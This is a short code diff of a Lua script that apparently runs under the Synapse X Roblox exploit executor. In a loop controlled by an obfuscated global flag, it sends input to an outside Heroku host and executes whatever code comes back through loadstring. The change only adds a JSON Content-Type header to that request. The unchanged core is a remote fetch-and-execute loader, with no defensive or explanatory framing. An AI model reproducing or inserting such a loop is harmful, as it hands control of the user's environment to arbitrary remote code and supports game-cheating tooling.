@@ -10,7 +10,14 @@ while true do
 	if not getgenv()["FN2h-jrnFJ2rhrns-iVBU2b"] then
 		break
 	end
-	loadstring(syn.request({ Url = "https://arduinou.herokuapp.com/script", Body = input, Method = "POST" }).Body)()
+	loadstring(syn.request({
+		Url = "https://arduinou.herokuapp.com/script",
+		Body = input,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json",
+		},
+	}).Body)()
 	if not getgenv()["FN2h-jrnFJ2rhrns-iVBU2b"] then
 		break
 	end
